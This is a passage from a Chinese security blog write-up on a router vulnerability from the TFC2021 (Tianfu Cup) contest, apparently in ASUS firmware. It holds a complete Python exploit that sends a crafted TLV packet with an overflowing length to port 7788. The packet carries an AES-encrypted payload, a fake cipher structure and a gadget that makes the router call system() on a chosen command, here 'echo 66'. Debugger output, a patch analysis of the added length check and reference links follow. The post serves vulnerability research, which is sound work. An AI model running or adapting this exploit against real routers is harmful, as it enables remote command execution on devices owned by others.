+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x528cc    mov    r0, r6</span><br><span class="line">  0x528d0    ldr    r3, [r5, #4]</span><br><span class="line">  0x528d4    ldr    r2, [sp, #0x38]</span><br><span class="line">  0x528d8    rev    r1, r1</span><br><span class="line">► 0x528dc    blx    r3                            &lt;system@plt&gt;</span><br><span class="line">       command: 0xb6500970 ◂— &#x27;echo 66&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>而第二种劫持方式的第一个参数为<strong>in</strong>，应该可以控制相当长的数据。不过由于更改堆布局很麻烦，笔者也就没有进一步探究，感兴趣的读者可以自行尝试。</p>
+<p>以下是笔者第一种劫持方式的exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&lt;I&quot;</span>, x)</span><br><span class="line">p32b = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&gt;I&quot;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_tlv_request</span>(<span class="params">_tlv_type, _tlv_len, _tlv_crc, _tlv_data=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p32b(_tlv_type) + p32b(_tlv_len) + p32b(_tlv_crc) + _tlv_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>))</span><br><span class="line">tlv_type = <span class="number">0x5</span></span><br><span class="line">tlv_len = <span class="number">0xffffffff</span></span><br><span class="line">tlv_crc = <span class="number">0</span></span><br><span class="line">request = make_tlv_request(tlv_type, tlv_len, tlv_crc)</span><br><span class="line">s.send(request)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.text:000528CC 06 00 A0 E1                   MOV             R0, R6</span></span><br><span class="line"><span class="string">.text:000528D0 04 30 95 E5                   LDR             R3, [R5,#4]</span></span><br><span class="line"><span class="string">.text:000528D4 38 20 9D E5                   LDR             R2, [SP,#0x38+arg_0]</span></span><br><span class="line"><span class="string">.text:000528D8 31 1F BF E6                   REV             R1, R1</span></span><br><span class="line"><span class="string">.text:000528DC 33 FF 2F E1                   BLX             R3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">gadget_add = <span class="number">0x000528CC</span></span><br><span class="line">system_plt = <span class="number">0x00014754</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xb6500760: fake cipher</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x000001aa</span>) + p32(<span class="number">0x00000010</span>) + p32(<span class="number">0x00000020</span>) + p32(<span class="number">0x00000000</span>)</span><br><span class="line">payload+= p32(<span class="number">0x00100000</span>) + p32(<span class="number">0xb6e2f480</span>) + p32(gadget_add) + p32(<span class="number">0x00000000</span>)</span><br><span class="line">payload+= p32(<span class="number">0x00000100</span>) + p32(<span class="number">0x00000000</span>) + p32(<span class="number">0x00000000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x210</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+= <span class="string">b&quot;echo 66\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+= p32(<span class="number">0xb6500760</span>)</span><br><span class="line">payload+= p32(system_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0x280</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">tlv_type = <span class="number">0x28</span></span><br><span class="line">tlv_len = <span class="number">0xffffffff</span></span><br><span class="line">tlv_crc = <span class="number">0</span></span><br><span class="line">tlv_data = aes_encode(payload, <span class="string">b&quot;12345678000000000000000000000000&quot;</span>)</span><br><span class="line">request = make_tlv_request(tlv_type, tlv_len, tlv_crc, tlv_data)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>))</span><br><span class="line">s.sendall(request)</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v15 &lt;= recv_len )</span><br><span class="line">    &#123;</span><br><span class="line">      tlv_type = *tlv_buf;</span><br><span class="line">      tlv_len = tlv_buf[<span class="number">1</span>];</span><br><span class="line">      tlv_crc = tlv_buf[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">if</span> ( recv_len - <span class="number">12</span> != bswap32(tlv_len) )</span><br><span class="line">      &#123;</span><br><span class="line">      ...</span><br><span class="line">          <span class="keyword">return</span> ;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+
+<p>在<strong>cm_packetProcess</strong>函数中，加入了对<strong>tlv_len</strong>的检查，即检查接收数据长度的减去12是否与tlv_len相等，不等则直接返回。这样就可以避免<strong>tlv_len</strong>被控制为一个很大的值，从而避免整数溢出。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/">https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/</a></p>
+<p><a target="_blank" rel="noopener" href="https://cq674350529.github.io/2023/08/05/Analyzing-the-Vulnerability-in-ASUS-Router-maybe-from-TFC2021/">https://cq674350529.github.io/2023/08/05/Analyzing-the-Vulnerability-in-ASUS-Router-maybe-from-TFC2021/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/IOT/" rel="tag"># IOT</a>
+              <a href="/tags/%E5%A4%A9%E5%BA%9C%E6%9D%AF/" rel="tag"># 天府杯</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/12/15/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/" rel="prev" title="AFL源码阅读小记">
+      <i class="fa fa-chevron-left"></i> AFL源码阅读小记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">4.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">fxc233</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fxc233</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
